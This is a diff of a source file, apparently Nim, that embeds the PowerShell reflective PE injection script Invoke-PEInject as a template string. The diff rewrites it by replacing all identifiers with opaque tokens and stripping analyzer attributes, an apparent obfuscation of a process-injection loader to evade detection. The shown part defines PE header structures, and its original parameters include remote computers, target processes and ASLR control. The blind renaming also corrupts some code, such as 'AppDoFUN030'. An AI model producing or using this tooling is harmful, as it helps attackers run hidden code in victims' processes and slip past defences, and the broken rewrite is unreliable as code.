@@ -1,757 +1,741 @@
 let Powershelltemplate* = """
 
-function Invoke-PEInject {
-    
+function FUN000 {
 
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $true)]
         [ValidateNotNullOrEmpty()]
         [Byte[]]
-        $PEBytes,
+        $VAR001,
 
         [Parameter(Position = 1)]
         [String[]]
-        $ComputerName,
+        $VAR002,
 
         [Parameter(Position = 2)]
-        [ValidateSet( 'WString', 'String', 'Void', 'None' )]
+        [ValidateSet( 'WideStr', 'Str', 'NoOutput', 'DefaultSettings' )]
         [String]
-        $FuncReturnType = 'None',
+        $VAR003 = 'DefaultSettings',
 
         [Parameter(Position = 3)]
         [String]
-        $ExeArgs,
+        $VAR004,
 
         [Parameter(Position = 4)]
         [Int32]
-        $ProcId,
+        $VAR005,
 
         [Parameter(Position = 5)]
         [String]
-        $ProcName,
+        $VAR006,
 
         [Switch]
-        $ForceASLR,
+        $VAR007,
 
         [Switch]
-        $DoNotZeroMZ
+        $VAR008
     )
 
     Set-StrictMode -Version 2
 
 
-    $RemoteScriptBlock = {
+    $VAR009 = {
         [CmdletBinding()]
         Param(
             [Parameter(Position = 0, Mandatory = $true)]
             [Byte[]]
-            $PEBytes,
+            $VAR001,
 
             [Parameter(Position = 1, Mandatory = $true)]
             [String]
-            $FuncReturnType,
+            $VAR003,
 
             [Parameter(Position = 2, Mandatory = $true)]
             [Int32]
-            $ProcId,
+            $VAR005,
 
             [Parameter(Position = 3, Mandatory = $true)]
             [String]
-            $ProcName,
+            $VAR006,
 
             [Parameter(Position = 4, Mandatory = $true)]
             [Bool]
-            $ForceASLR,
+            $VAR007,
 
             [Parameter(Position = 5, Mandatory = $true)]
             [String]
-            $ExeArgs
+            $VAR004
         )
     
         
         
         
-        Function Get-Win32Types {
-            $Win32Types = New-Object System.Object
+        Function FUN001 {
+            $VAR010 = New-Object System.Object
 
             
             
-            $Domain = [AppDomain]::CurrentDomain
-            $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
-            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
-            $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+            $DoFUN030 = [AppDoFUN030]::CurrentDoFUN030
+            $VAR012 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+            $VAR013 = $DoFUN030.DefineDynamicAssembly($VAR012, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $VAR014 = $VAR013.DefineDynamicModule('DynamicModule', $false)
+            $VAR015 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
 
 
             
             
-            $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
-            $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
-            $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
-            $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
-            $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
-            $MachineType = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
+            $VAR011 = $VAR014.DefineEnum('MachineType', 'Public', [UInt16])
+            $VAR011.DefineLiteral('Native', [UInt16] 0) | Out-Null
+            $VAR011.DefineLiteral('CONST089', [UInt16] 0x014c) | Out-Null
+            $VAR011.DefineLiteral('CONST090', [UInt16] 0x0200) | Out-Null
+            $VAR011.DefineLiteral('CONST091', [UInt16] 0x8664) | Out-Null
+            $VAR016 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name MachineType -Value $VAR016
 
             
-            $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
-            $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
-            $MagicType = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
+            $VAR011 = $VAR014.DefineEnum('MagicType', 'Public', [UInt16])
+            $VAR011.DefineLiteral('CONST100', [UInt16] 0x10b) | Out-Null
+            $VAR011.DefineLiteral('CONST101', [UInt16] 0x20b) | Out-Null
+            $VAR021 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name MagicType -Value $VAR021
 
             
-            $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
-            $SubSystemType = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
+            $VAR011 = $VAR014.DefineEnum('CONST047Type', 'Public', [UInt16])
+            $VAR011.DefineLiteral('CONST102', [UInt16] 0) | Out-Null
+            $VAR011.DefineLiteral('CONST103', [UInt16] 1) | Out-Null
+            $VAR011.DefineLiteral('CONST104', [UInt16] 2) | Out-Null
+            $VAR011.DefineLiteral('CONST099', [UInt16] 3) | Out-Null
+            $VAR011.DefineLiteral('CONST098', [UInt16] 7) | Out-Null
+            $VAR011.DefineLiteral('CONST097', [UInt16] 9) | Out-Null
+            $VAR011.DefineLiteral('CONST096', [UInt16] 10) | Out-Null
+            $VAR011.DefineLiteral('CONST095', [UInt16] 11) | Out-Null
+            $VAR011.DefineLiteral('CONST094', [UInt16] 12) | Out-Null
+            $VAR011.DefineLiteral('CONST093', [UInt16] 13) | Out-Null
+            $VAR011.DefineLiteral('CONST092', [UInt16] 14) | Out-Null
+            $VAR017 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST047Type -Value $VAR017
 
             
-            $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
-            $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
-            $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
-            $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
-            $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
-            $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
-            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
-            $DllCharacteristicsType = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType
+            $VAR011 = $VAR014.DefineEnum('CONST035Type', 'Public', [UInt16])
+            $VAR011.DefineLiteral('CONST080', [UInt16] 0x0001) | Out-Null
+            $VAR011.DefineLiteral('CONST079', [UInt16] 0x0002) | Out-Null
+            $VAR011.DefineLiteral('CONST078', [UInt16] 0x0004) | Out-Null
+            $VAR011.DefineLiteral('CONST077', [UInt16] 0x0008) | Out-Null
+            $VAR011.DefineLiteral('CONST088', [UInt16] 0x0040) | Out-Null
+            $VAR011.DefineLiteral('CONST087', [UInt16] 0x0080) | Out-Null
+            $VAR011.DefineLiteral('CONST086', [UInt16] 0x0100) | Out-Null
+            $VAR011.DefineLiteral('CONST085', [UInt16] 0x0200) | Out-Null
+            $VAR011.DefineLiteral('CONST084', [UInt16] 0x0400) | Out-Null
+            $VAR011.DefineLiteral('CONST083', [UInt16] 0x0800) | Out-Null
+            $VAR011.DefineLiteral('CONST076', [UInt16] 0x1000) | Out-Null
+            $VAR011.DefineLiteral('CONST082', [UInt16] 0x2000) | Out-Null
+            $VAR011.DefineLiteral('CONST081', [UInt16] 0x8000) | Out-Null
+            $VAR018 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST035Type -Value $VAR018
 
             
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
-        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
-        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
-            $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST075', $VAR019, [System.ValueType], 8)
+        ($VAR011.DefineField('CONST074', [UInt32], 'Public')).SetOffset(0) | Out-Null
+        ($VAR011.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
+            $VAR020 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST075 -Value $VAR020
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
-            $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
-            $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST073', $VAR019, [System.ValueType], 20)
+            $VAR011.DefineField('Machine', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST072', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST070', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST069', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST068', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST067', [UInt16], 'Public') | Out-Null
+            $VAR022 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST073 -Value $VAR022
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
-        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
-        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
-        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
-        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
-        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
-        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
-        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
-        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
-        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
-        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
-        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
-        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
-        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
-        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
-        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
-        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
-        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
-        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
-        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
-        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
-        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
-        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
-        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
-        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
-        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
-        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
-        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
-        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
-        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
-        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
-        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
-        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
-        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
-        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
-        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
-        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
-            $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST066', $VAR019, [System.ValueType], 240)
+        ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
+        ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
+        ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
+        ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
+        ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
+        ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
+        ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
+        ($VAR011.DefineField('CONST059', [UInt32], 'Public')).SetOffset(20) | Out-Null
+        ($VAR011.DefineField('CONST058', [UInt64], 'Public')).SetOffset(24) | Out-Null
+        ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
+        ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
+        ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
+        ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
+        ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
+        ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
+        ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
+        ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
+        ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
+        ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
+        ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
+        ($VAR011.DefineField('CONST048', [UInt32], 'Public')).SetOffset(64) | Out-Null
+        ($VAR011.DefineField('CONST047', $VAR017, 'Public')).SetOffset(68) | Out-Null
+        ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
+        ($VAR011.DefineField('CONST046', [UInt64], 'Public')).SetOffset(72) | Out-Null
+        ($VAR011.DefineField('CONST045', [UInt64], 'Public')).SetOffset(80) | Out-Null
+        ($VAR011.DefineField('CONST044', [UInt64], 'Public')).SetOffset(88) | Out-Null
+        ($VAR011.DefineField('CONST043', [UInt64], 'Public')).SetOffset(96) | Out-Null
+        ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(104) | Out-Null
+        ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(108) | Out-Null
+        ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(112) | Out-Null
+        ($VAR011.DefineField('CONST108', $VAR020, 'Public')).SetOffset(120) | Out-Null
+        ($VAR011.DefineField('CONST109', $VAR020, 'Public')).SetOffset(128) | Out-Null
+        ($VAR011.DefineField('CONST110', $VAR020, 'Public')).SetOffset(136) | Out-Null
+        ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(144) | Out-Null
+        ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(152) | Out-Null
+        ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(160) | Out-Null
+        ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(168) | Out-Null
+        ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(176) | Out-Null
+        ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(184) | Out-Null
+        ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(192) | Out-Null
+        ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(200) | Out-Null
+        ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(208) | Out-Null
+        ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(216) | Out-Null
+        ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(224) | Out-Null
+        ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(232) | Out-Null
+            $VAR023 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST066 -Value $VAR023
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
-        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
-        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
-        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
-        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
-        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
-        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
-        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
-        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
-        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
-        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
-        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
-        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
-        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
-        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
-        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
-        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
-        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
-        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
-        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
-        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
-        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
-        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
-        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
-        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
-        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
-        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
-        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
-        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
-        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
-        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
-        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
-        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
-        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
-        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
-        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
-        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
-        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
-        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
-            $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST118', $VAR019, [System.ValueType], 224)
